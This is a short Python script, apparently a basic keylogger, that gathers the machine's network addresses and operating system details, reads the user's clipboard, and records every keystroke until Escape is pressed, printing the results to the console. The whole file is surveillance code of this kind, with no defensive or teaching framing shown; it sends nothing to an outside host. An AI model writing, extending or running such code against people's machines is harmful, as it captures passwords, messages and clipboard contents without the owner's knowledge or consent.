from pynput import keyboard
import psutil
import os
import platform
import win32clipboard

keys = []

def get_sys_info():
    ips = psutil.net_if_addrs()
    _os = os.name
    _platform = platform.system()
    return ips, _os, _platform

print(get_sys_info())

def get_clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return data

clipboard = get_clipboard()

print(f"User clipboard: {clipboard}")

def key_press(key):
    try:
        keys.append(key.char)
    except:
        keys.append(key)

def release(key):
    if key == keyboard.Key.esc:
        print(keys)
        return False

with keyboard.Listener(
        on_press=key_press,
        on_release=release) as listener:
    listener.join()
listener.start()



